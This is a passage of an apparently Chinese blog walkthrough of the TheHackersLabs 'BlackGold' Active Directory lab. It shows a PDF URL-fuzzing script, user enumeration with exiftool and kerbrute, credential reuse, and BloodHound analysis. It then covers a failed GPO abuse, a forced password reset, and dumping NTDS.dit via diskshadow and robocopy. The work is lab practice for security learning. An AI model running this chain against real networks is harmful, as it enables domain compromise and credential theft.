= f\u003cspan class=\"hljs-string\"\u003e\"{year}-{month:02d}-{day:02d}\"\u003c/span\u003e\n                filename = f\u003cspan class=\"hljs-string\"\u003e\"{date_str}.pdf\"\u003c/span\u003e\n                url_path = f\u003cspan class=\"hljs-string\"\u003e\"/docs/{filename}\"\u003c/span\u003e\n                full_url = f\u003cspan class=\"hljs-string\"\u003e\"{BASE_URL}{url_path}\"\u003c/span\u003e\n\n                try:\n                    \u003cspan class=\"hljs-comment\"\u003e# 打印单行进度条，end='\\r' 让光标回到行首，实现动态更新\u003c/span\u003e\n                    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"[*] 正在尝试: {full_url}   \"\u003c/span\u003e, end=\u003cspan class=\"hljs-string\"\u003e'\\r'\u003c/span\u003e)\n\n                    \u003cspan class=\"hljs-comment\"\u003e# 发送请求，stream=True 用于下载大文件，不会一次性读入内存\u003c/span\u003e\n                    response = requests.get(full_url, \u003cspan class=\"hljs-built_in\"\u003etimeout\u003c/span\u003e=5, stream=True)\n\n                    \u003cspan class=\"hljs-comment\"\u003e# 3. 如果状态码为 200，则保存文件\u003c/span\u003e\n                    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e response.status_code == 200:\n                        \u003cspan class=\"hljs-comment\"\u003e# 打印成功信息（在新的一行，避免被进度条覆盖）\u003c/span\u003e\n                        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"\\n[+] 成功! 找到文件: {full_url} (状态码: 200)\"\u003c/span\u003e)\n                        \n                        \u003cspan class=\"hljs-comment\"\u003e# 定义本地保存路径\u003c/span\u003e\n                        file_path = os.path.join(OUTPUT_DIR, filename)\n                        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"    -\u003e 正在保存到: {file_path}...\"\u003c/span\u003e)\n\n                        \u003cspan class=\"hljs-comment\"\u003e# 以二进制写模式 ('wb') 打开文件并写入内容\u003c/span\u003e\n                        with open(file_path, \u003cspan class=\"hljs-string\"\u003e'wb'\u003c/span\u003e) as f:\n                            \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e chunk \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e response.iter_content(chunk_size=8192):\n                                f.write(chunk)\n                        \n                        found_files_count += 1\n\n                except requests.exceptions.RequestException as e:\n                    \u003cspan class=\"hljs-comment\"\u003e# 如果发生连接错误，打印出来\u003c/span\u003e\n                    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"\\n[!] 连接错误: {full_url} - {e}\"\u003c/span\u003e)\n    \n    \u003cspan class=\"hljs-comment\"\u003e# 4. 结束时打印总结\u003c/span\u003e\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"\\n\\n[*] 爆破完成。\"\u003c/span\u003e)\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e found_files_count \u003e 0:\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"[*] 共下载了 {found_files_count} 个 PDF 文件到 '{OUTPUT_DIR}' 目录。\"\u003c/span\u003e)\n    \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e:\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"[*] 未找到任何可用的文件。\"\u003c/span\u003e)\n\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e __name__ == \u003cspan class=\"hljs-string\"\u003e\"__main__\"\u003c/span\u003e:\n    fuzz_and_download()\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e用户枚举\u003c/h2\u003e\n\u003cp\u003e将作者 \u003ccode\u003eauthor\u003c/code\u003e 和 \u003ccode\u003eCreator\u003c/code\u003e 信息截取出来\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eexiftool PDF/found_pdfs/* | grep -E \u003cspan class=\"hljs-string\"\u003e'Author|Creator'\u003c/span\u003e | grep -v \u003cspan class=\"hljs-string\"\u003e'Neptune Oil \u0026#x26; Gas'\u003c/span\u003e | \u003cspan class=\"hljs-built_in\"\u003ecut\u003c/span\u003e -d: -f 2 | sed \u003cspan class=\"hljs-string\"\u003e's/^ *//'\u003c/span\u003e | \u003cspan class=\"hljs-built_in\"\u003esort\u003c/span\u003e | \u003cspan class=\"hljs-built_in\"\u003euniq\u003c/span\u003e \u003e users.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用\u003ccode\u003ekerbrute\u003c/code\u003e 枚举\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  BlackGold kerbrute -\u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e users.txt -domain neptune.thl -dc-ip 192.168.56.10\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Valid user =\u003e Lucas.Miller\n[*] No passwords were discovered :\u003cspan class=\"hljs-string\"\u003e'(\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e找到用户名\u003ccode\u003eLucas.Miller\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e再尝试一下再\u003ccode\u003ePDF\u003c/code\u003e文件中读取有关\u003ccode\u003eLucas.Miller\u003c/code\u003e 的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  BlackGold pdfgrep -i \u003cspan class=\"hljs-string\"\u003e'Lucas.Miller'\u003c/span\u003e PDF/found_pdfs/*     \nPDF/found_pdfs/2023-01-12.pdf:Estimado Lucas Miller,\nPDF/found_pdfs/2023-01-12.pdf:   ● Nombre de usuario (Usuario AD): lucas.miller@neptune.thl\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsBlackGold/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e得到一串密码 \u003ccode\u003eE@6q%TnR7UEQSXywr8^@\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e测试凭据是否有效\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  BlackGold nxc smb neptune.thl -u \u003cspan class=\"hljs-string\"\u003e'Lucas.Miller'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'E@6q%TnR7UEQSXywr8^@'\u003c/span\u003e\nSMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:neptune.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.10   445    DC01             [+] neptune.thl\\Lucas.Miller:E@6q%TnR7UEQSXywr8^@ \n\n➜  BlackGold nxc ldap neptune.thl -u \u003cspan class=\"hljs-string\"\u003e'Lucas.Miller'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'E@6q%TnR7UEQSXywr8^@'\u003c/span\u003e\nLDAP        192.168.56.10   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:neptune.thl)\nLDAP        192.168.56.10   389    DC01             [+] neptune.thl\\Lucas.Miller:E@6q%TnR7UEQSXywr8^@ \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e域分析\u003c/h2\u003e\n\u003cp\u003e上 \u003ccode\u003eBloodHound\u003c/code\u003e 分析一波\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  BlackGold bloodhound-python -d \u003cspan class=\"hljs-string\"\u003e'neptune.thl'\u003c/span\u003e -ns 192.168.56.10 --zip -c All -dc \u003cspan class=\"hljs-string\"\u003e'DC01.neptune.thl'\u003c/span\u003e -u \u003cspan class=\"hljs-string\"\u003e'Lucas.Miller'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'E@6q%TnR7UEQSXywr8^@'\u003c/span\u003e \nINFO: BloodHound.py \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: neptune.thl\nINFO: Getting TGT \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e user\nINFO: Connecting to LDAP server: DC01.neptune.thl\nINFO: Found 1 domains\nINFO: Found 1 domains \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: DC01.neptune.thl\nINFO: Found 8 \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e\nINFO: Found 53 \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: DC01.neptune.thl\nINFO: Done \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 00M 01S\nINFO: Compressing output into 20250715122943_bloodhound.zip\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eusers\u003c/code\u003e 组\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsBlackGold/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e观察了一下，用户\u003ccode\u003eVictor Rodriguez\u003c/code\u003e 的密码写在了\u003ccode\u003eDescription\u003c/code\u003e 上\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsBlackGold/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e并且其属于\u003ccode\u003eIT\u003c/code\u003e组，在\u003ccode\u003eSMB\u003c/code\u003e中有一个\u003ccode\u003eIT\u003c/code\u003e的共享文件夹\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsBlackGold/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e远程管理组用户有两个，暂时是横向目标\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsBlackGold/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e横向移动\u003c/h2\u003e\n\u003ch3\u003eTo emma.johnson\u003c/h3\u003e\n\u003cp\u003e测试上面的凭据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  BlackGold nxc smb neptune.thl -u \u003cspan class=\"hljs-string\"\u003e'Victor.Rodriguez'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'H5gVCzzZkzJ#wGsT8u1$'\u003c/span\u003e\nSMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:neptune.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.10   445    DC01             [+] neptune.thl\\Victor.Rodriguez:H5gVCzzZkzJ#wGsT8u1$\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eSMB\u003c/code\u003e里面能得到一个\u003ccode\u003epowershell\u003c/code\u003e脚本\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  BlackGold smbclient //192.168.56.10/IT -U neptune.thl/Victor.Rodriguez%\u003cspan class=\"hljs-string\"\u003e'H5gVCzzZkzJ#wGsT8u1$'\u003c/span\u003e            \nTry \u003cspan class=\"hljs-string\"\u003e\"help\"\u003c/span\u003e to get a list of possible commands.\nsmb: \\\u003e \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e\n  .                                   D        0  Thu Feb 27 08:14:40 2025\n  ..                                DHS        0  Fri Feb 28 03:52:00 2025\n  Scripts                             D        0  Thu Feb 27 08:16:55 2025\n\n                10540543 blocks of size 4096. 7161242 blocks available\nsmb: \\\u003e \u003cspan class=\"hljs-built_in\"\u003ecd\u003c/span\u003e Scripts\\\nsmb: \\Scripts\\\u003e \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e\n  .                                   D        0  Thu Feb 27 08:16:55 2025\n  ..                                  D        0  Thu Feb 27 08:14:40 2025\n  backup.ps1                          A     1957  Thu Feb 27 08:20:11 2025\n\n                10540543 blocks of size 4096. 7161244 blocks available\nsmb: \\Scripts\\\u003e get backup.ps1 \ngetting file \\Scripts\\backup.ps1 of size 1957 as backup.ps1 (382.2 KiloBytes/sec) (average 382.2 KiloBytes/sec)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e打开后能得到用户\u003ccode\u003eemma.johnson\u003c/code\u003e 的凭据，密码：\u003ccode\u003esb9TVndq8N@tUVMmP2@#\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsBlackGold/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eemma.johnson\u003c/code\u003e 是我们在上面看到在远程管理组里面的用户\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  BlackGold nxc winrm neptune.thl -u \u003cspan class=\"hljs-string\"\u003e'emma.johnson'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'sb9TVndq8N@tUVMmP2@#'\u003c/span\u003e\nWINRM       192.168.56.10   5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:neptune.thl)\n  arc4 = algorithms.ARC4(self._key)\nWINRM       192.168.56.10   5985   DC01             [+] neptune.thl\\emma.johnson:sb9TVndq8N@tUVMmP2@# (Pwn3d!)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsBlackGold/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e该用户能得到 \u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\Emma Johnson\\Desktop\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e user.txt\na5xxxxxxxxxxxxxxxxxxxxxxxx\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eTo thomas.brown\u003c/h3\u003e\n\u003cp\u003e当前用户权限\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsBlackGold/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e下一个用户包是\u003ccode\u003eThomas Brown\u003c/code\u003e ，因为他属于\u003ccode\u003eBACKUP OPERATORS\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsBlackGold/image13.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e重新导入下\u003ccode\u003eBloodHound\u003c/code\u003e的数据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\tbloodhound-python -d \u003cspan class=\"hljs-string\"\u003e'neptune.thl'\u003c/span\u003e -ns 192.168.56.10 --zip -c All -dc \u003cspan class=\"hljs-string\"\u003e'DC01.neptune.thl'\u003c/span\u003e -u \u003cspan class=\"hljs-string\"\u003e'emma.johnson'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'sb9TVndq8N@tUVMmP2@#'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eGPO 滥用 \u003cstrong\u003e❌\u003c/strong\u003e\u003c/h3\u003e\n\u003cp\u003e能看到\u003ccode\u003eemma.johnson\u003c/code\u003e 有新的权限\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsBlackGold/image14.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e该组策略影响很多用户\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsBlackGold/image15.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e使用\u003ccode\u003ebloodyAD\u003c/code\u003e来实现\u003c/p\u003e\n\u003cp\u003e赋予\u003ccode\u003eemma.johnson\u003c/code\u003e自己拥有对该 \u003ccode\u003eGPO\u003c/code\u003e 的 \u003ccode\u003egenericAll\u003c/code\u003e 权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  BlackGold bloodyAD -d \u003cspan class=\"hljs-string\"\u003e'neptune.thl'\u003c/span\u003e --dc-ip 192.168.56.10 -u \u003cspan class=\"hljs-string\"\u003e'emma.johnson'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'sb9TVndq8N@tUVMmP2@#'\u003c/span\u003e add genericAll \u003cspan class=\"hljs-string\"\u003e'CN={037ECEDE-7C98-4D00-95D5-4283F4271B0D},CN=POLICIES,CN=SYSTEM,DC=NEPTUNE,DC=THL'\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'emma.johnson'\u003c/span\u003e\n[+] emma.johnson has now GenericAll on CN={037ECEDE-7C98-4D00-95D5-4283F4271B0D},CN=POLICIES,CN=SYSTEM,DC=NEPTUNE,DC=THL\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这里很奇怪，这里使用了好几个工具也无法利用\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epython3 GPOwned.py -u \u003cspan class=\"hljs-string\"\u003e'emma.johnson'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'sb9TVndq8N@tUVMmP2@#'\u003c/span\u003e -d \u003cspan class=\"hljs-string\"\u003e'neptune.thl'\u003c/span\u003e -dc-ip \u003cspan class=\"hljs-string\"\u003e'192.168.56.10'\u003c/span\u003e -gpcmachine -gpoimmtask -name \u003cspan class=\"hljs-string\"\u003e'{037ECEDE-7C98-4D00-95D5-4283F4271B0D}'\u003c/span\u003e -author \u003cspan class=\"hljs-string\"\u003e'neptune.thl\\Administrador'\u003c/span\u003e -taskname \u003cspan class=\"hljs-string\"\u003e'Beautiful IOC'\u003c/span\u003e -taskdescription \u003cspan class=\"hljs-string\"\u003e'Hello World'\u003c/span\u003e -dstpath \u003cspan class=\"hljs-string\"\u003e'c:\\windows\\system32\\calc.exe'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsBlackGold/image16.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e最后看了\u003ccode\u003eWP\u003c/code\u003e发现人家的和我不一样\u003c/p\u003e\n\u003ch3\u003eForce Change PassWord\u003c/h3\u003e\n\u003cp\u003e这里重新导入了一下机器，然后再次导入新的数据，就可以看到\u003ccode\u003eemma.johnson\u003c/code\u003e可以修改\u003ccode\u003ethomas\u003c/code\u003e的密码\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsBlackGold/image17.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e通过 \u003ccode\u003eBloodAD\u003c/code\u003e修改密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  BlackGold bloodyAD -d \u003cspan class=\"hljs-string\"\u003e'neptune.thl'\u003c/span\u003e --dc-ip 192.168.56.10 -u \u003cspan class=\"hljs-string\"\u003e'emma.johnson'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'sb9TVndq8N@tUVMmP2@#'\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e password thomas.brown Admin@123\n[+] Password changed successfully!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e登录\u003ccode\u003ethomas.brown\u003c/code\u003e账户\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsBlackGold/image18.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003e转储 NTDS\u003c/h3\u003e\n\u003cp\u003e上面我们就知道\u003ccode\u003ethomas.brown\u003c/code\u003e 属于\u003ccode\u003eBACKUP OPERATORS\u003c/code\u003e 组\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ewhoami\u003c/code\u003e信息中也能看出来\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsBlackGold/image19.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e利用：\u003ca href=\"https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html?highlight=backup%20op#using-diskshadowexe\"\u003ehttps://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html?highlight=backup%20op#using-diskshadowexe\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e因为\u003ccode\u003ewinrm\u003c/code\u003e是非交互会话，我们需要对其进行修改\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"set context persistent nowriters\"\u003c/span\u003e \u003e C:\\Windows\\Temp\\ntds_shadow.txt\n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"add volume C: alias shadow_c\"\u003c/span\u003e \u003e\u003e C:\\Windows\\Temp\\ntds_shadow.txt\n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"create\"\u003c/span\u003e \u003e\u003e C:\\Windows\\Temp\\ntds_shadow.txt\n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"expose %shadow_c% Z:\"\u003c/span\u003e \u003e\u003e C:\\Windows\\Temp\\ntds_shadow.txt\ndiskshadow /s C:\\Windows\\Temp\\ntds_shadow.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003erobocopy /B Z:\\Windows\\NTDS\\ C:\\rev ntds.dit\nrobocopy /B Z:\\Windows\\System32\\config\\ C:\\rev SYSTEM\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e再通过 \u003ccode\u003esecretdump\u003c/code\u003e 转储出来\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsBlackGold/image20.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e常规思路，除了有些坑\u003c/p\u003e","title":"TheHackersLabs - BlackGold","date":"2025-07-15","updated":"2025-07-15","tags":["TheHackersLabs","Windows","NTDS","exiftool","Domain","AD"],"categories":"靶机","comments":true,"description":"BlackGold\n\n https://labs.thehackerslabs.com/machine/9\n \n\n\n\nRecon\n\n端口扫描\n\n\n\n\n\n\n\n访问 `HTTP` 服务，通过`IIS`搭建\n\n\n\n目录扫描，没发现什么可疑的文件夹\n\n\n\n页面拉到下面可以下载 `PDF` 文件\n\n\n\n图片上两个`PDF`内容都都是无用的，我们检查一下`PDF`元信息\n\n\n\n作者信息中能得到两个用户名`Da..."},"recentPosts":[{"id":"HackMyVMBirdeye","title":"HackMyVM - Birdeye","date":"2025-10-17","isEncrypted":false,"year":"2025","month":"10","day":"17"},{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","isEncrypted":true,"year":"2025","month":"10","day":"14"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Machine - TombWatcher","date":"2025-06-08","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason8 - Certificate","title":"HackTheBox - Machine - Certificate","date":"2025-06-02","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason9 - Imagery","title":"HackTheBox - Season9 - Imagery","date":"2025-10-04","isEncrypted":true,"year":"2025","month":"10","day":"04"},{"id":"TheHackersLabsTortuga","title":"TheHackersLabs - Tortuga","date":"2025-10-01","isEncrypted":false,"year":"2025","month":"10","day":"01"},{"id":"TheHackersLabsElevator","title":"TheHackersLabs - Elevator","date":"2025-09-29","isEncrypted":false,"year":"2025","month":"09","day":"29"}]},"__N_SSG":true},"page":"/[year]/[month]/[day]/[id]","query":{"year":"2025","month":"07","day":"15","id":"TheHackersLabsBlackGold"},"buildId":"QF_69xfpA3_zMvnMTdy4T","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>